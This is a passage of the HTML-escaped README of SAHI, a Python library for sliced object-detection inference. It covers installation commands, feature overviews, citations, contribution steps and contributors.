href=&#34;https://colab.research.google.com/github/obss/sahi/blob/main/demo/inference_for_mmdetection.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;sahi-mmdetection&#34;&gt;&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;Detectron2&lt;/code&gt; + &lt;code&gt;SAHI&lt;/code&gt; walkthrough: &lt;a href=&#34;https://colab.research.google.com/github/obss/sahi/blob/main/demo/inference_for_detectron2.ipynb&#34;&gt;&lt;img src=&#34;https://colab.research.google.com/assets/colab-badge.svg?sanitize=true&#34; alt=&#34;sahi-detectron2&#34;&gt;&lt;/a&gt; (NEW)&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://huggingface.co/spaces/fcakyon/sahi-yolox&#34;&gt;&lt;img width=&#34;600&#34; src=&#34;https://user-images.githubusercontent.com/34196005/144092739-c1d9bade-a128-4346-947f-424ce00e5c4f.gif&#34; alt=&#34;sahi-yolox&#34;&gt;&lt;/a&gt;&lt;/p&gt;  &#xA;&lt;h3&gt;Installation&lt;/h3&gt; &#xA;&lt;img width=&#34;700&#34; alt=&#34;sahi-installation&#34; src=&#34;https://user-images.githubusercontent.com/34196005/149311602-b44e6fe1-f496-40f2-a7ae-5ea1f66e1550.gif&#34;&gt; &#xA;&lt;details closed&gt; &#xA; &lt;summary&gt; &lt;big&gt;&lt;b&gt;Installation details:&lt;/b&gt;&lt;/big&gt; &lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Install &lt;code&gt;sahi&lt;/code&gt; using pip:&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;pip install sahi&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;On Windows, &lt;code&gt;Shapely&lt;/code&gt; needs to be installed via Conda:&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;conda install -c conda-forge shapely&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Install your desired version of pytorch and torchvision:&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;conda install pytorch=1.10.2 torchvision=0.11.3 cudatoolkit=11.3 -c pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Install your desired detection framework (yolov5):&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;pip install yolov5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Install your desired detection framework (mmdet):&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;pip install mmcv-full==1.4.4 -f https://download.openmmlab.com/mmcv/dist/cu113/torch1.10.0/index.html&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;pip install mmdet==2.21.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Install your desired detection framework (detectron2):&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;pip install detectron2 -f https://dl.fbaipublicfiles.com/detectron2/wheels/cu113/torch1.10/index.html&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;h3&gt;Framework Agnostic Sliced/Standard Prediction&lt;/h3&gt; &#xA;&lt;img width=&#34;700&#34; alt=&#34;sahi-predict&#34; src=&#34;https://user-images.githubusercontent.com/34196005/149310540-e32f504c-6c9e-4691-8afd-59f3a1a457f0.gif&#34;&gt; &#xA;&lt;p&gt;Find detailed info on &lt;code&gt;sahi predict&lt;/code&gt; command at &lt;a href=&#34;https://raw.githubusercontent.com/obss/sahi/main/docs/cli.md#predict-command-usage&#34;&gt;cli.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Find detailed info on video inference at &lt;a href=&#34;https://github.com/obss/sahi/issues/457&#34;&gt;video inference tutorial&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Find detailed info on image/dataset slicing utilities at &lt;a href=&#34;https://raw.githubusercontent.com/obss/sahi/main/docs/slicing.md&#34;&gt;slicing.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Error Analysis Plots &amp;amp; Evaluation&lt;/h3&gt; &#xA;&lt;img width=&#34;700&#34; alt=&#34;sahi-analyse&#34; src=&#34;https://user-images.githubusercontent.com/34196005/149537858-22b2e274-04e8-4e10-8139-6bdcea32feab.gif&#34;&gt; &#xA;&lt;p&gt;Find detailed info at &lt;a href=&#34;https://github.com/obss/sahi/issues/356&#34;&gt;Error Analysis Plots &amp;amp; Evaluation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Interactive Visualization &amp;amp; Inspection&lt;/h3&gt; &#xA;&lt;img width=&#34;700&#34; alt=&#34;sahi-fiftyone&#34; src=&#34;https://user-images.githubusercontent.com/34196005/149321540-e6ddd5f3-36dc-4267-8574-a985dd0c6578.gif&#34;&gt; &#xA;&lt;p&gt;Find detailed info at &lt;a href=&#34;https://github.com/obss/sahi/issues/357&#34;&gt;Interactive Result Visualization and Inspection&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Other utilities&lt;/h3&gt; &#xA;&lt;p&gt;Find detailed info on COCO utilities (yolov5 conversion, slicing, subsampling, filtering, merging, splitting) at &lt;a href=&#34;https://raw.githubusercontent.com/obss/sahi/main/docs/coco.md&#34;&gt;coco.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Find detailed info on MOT utilities (ground truth dataset creation, exporting tracker metrics in mot challenge format) at &lt;a href=&#34;https://raw.githubusercontent.com/obss/sahi/main/docs/mot.md&#34;&gt;mot.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Citation&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;p&gt;If you use this package in your work, please cite it as:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;@article{akyon2022sahi,&#xA;  title={Slicing Aided Hyper Inference and Fine-tuning for Small Object Detection},&#xA;  author={Akyon, Fatih Cagatay and Altinuc, Sinan Onur and Temizel, Alptekin},&#xA;  journal={arXiv preprint arXiv:2202.06934},&#xA;  year={2022}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;@software{obss2021sahi,&#xA;  author       = {Akyon, Fatih Cagatay and Cengiz, Cemil and Altinuc, Sinan Onur and Cavusoglu, Devrim and Sahin, Kadir and Eryuksel, Ogulcan},&#xA;  title        = {{SAHI: A lightweight vision library for performing large scale object detection and instance segmentation}},&#xA;  month        = nov,&#xA;  year         = 2021,&#xA;  publisher    = {Zenodo},&#xA;  doi          = {10.5281/zenodo.5718950},&#xA;  url          = {https://doi.org/10.5281/zenodo.5718950}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Contributing&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;sahi&lt;/code&gt; library currently supports all &lt;a href=&#34;https://github.com/ultralytics/yolov5/releases&#34;&gt;YOLOv5 models&lt;/a&gt; and &lt;a href=&#34;https://github.com/open-mmlab/mmdetection/raw/master/docs/model_zoo.md&#34;&gt;MMDetection models&lt;/a&gt;. Moreover, it is easy to add new frameworks.&lt;/p&gt; &#xA;&lt;p&gt;All you need to do is, creating a new class in &lt;a href=&#34;https://raw.githubusercontent.com/obss/sahi/main/sahi/model.py&#34;&gt;model.py&lt;/a&gt; that implements &lt;a href=&#34;https://github.com/obss/sahi/raw/21ecb285aa6bf93c2a00605dfb9b138f19d8d62d/sahi/model.py#L21&#34;&gt;DetectionModel class&lt;/a&gt;. You can take the &lt;a href=&#34;https://github.com/obss/sahi/raw/21ecb285aa6bf93c2a00605dfb9b138f19d8d62d/sahi/model.py#L177&#34;&gt;MMDetection wrapper&lt;/a&gt; or &lt;a href=&#34;https://github.com/obss/sahi/raw/21ecb285aa6bf93c2a00605dfb9b138f19d8d62d/sahi/model.py#L388&#34;&gt;YOLOv5 wrapper&lt;/a&gt; as a reference.&lt;/p&gt; &#xA;&lt;p&gt;Before opening a PR:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install required development packages:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install -e .&#34;[dev]&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Reformat with black and isort:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;black . --config pyproject.toml&#xA;isort .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;&#xA; &lt;div align=&#34;center&#34;&gt;&#xA;  Contributors&#xA; &lt;/div&gt;&lt;/h2&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;p&gt;&lt;a align=&#34;left&#34; href=&#34;https://github.com/fcakyon&#34; target=&#34;_blank&#34;&gt;Fatih Cagatay Akyon&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;a align=&#34;left&#34; href=&#34;https://github.com/sinanonur&#34; target=&#34;_blank&#34;&gt;Sinan Onur Altinuc&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;a align=&#34;left&#34; href=&#34;https://github.com/devrimcavusoglu&#34; target=&#34;_blank&#34;&gt;Devrim Cavusoglu&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;a align=&#34;left&#34; href=&#34;https://github.com/cemilcengiz&#34; target=&#34;_blank&#34;&gt;Cemil Cengiz&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;a align=&#34;left&#34; href=&#34;https://github.com/oulcan&#34; target=&#34;_blank&#34;&gt;Ogulcan Eryuksel&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;a align=&#34;left&#34; href=&#34;https://github.com/kadirnar&#34; target=&#34;_blank&#34;&gt;Kadir Nar&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;a align=&#34;left&#34; href=&#34;https://github.com/madenburak&#34; target=&#34;_blank&#34;&gt;Burak Maden&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;a align=&#34;left&#34; href=&#34;https://github.com/ssahinnkadir&#34; target=&#34;_blank&#34;&gt;Kadir Sahin&lt;/a&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;a align=&#34;left&#34; href=&#34;https://github.com/weiji14&#34; target=&#34;_blank&#34;&gt;Wei Ji&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/div&gt;</summary>
  </entry>
</feed>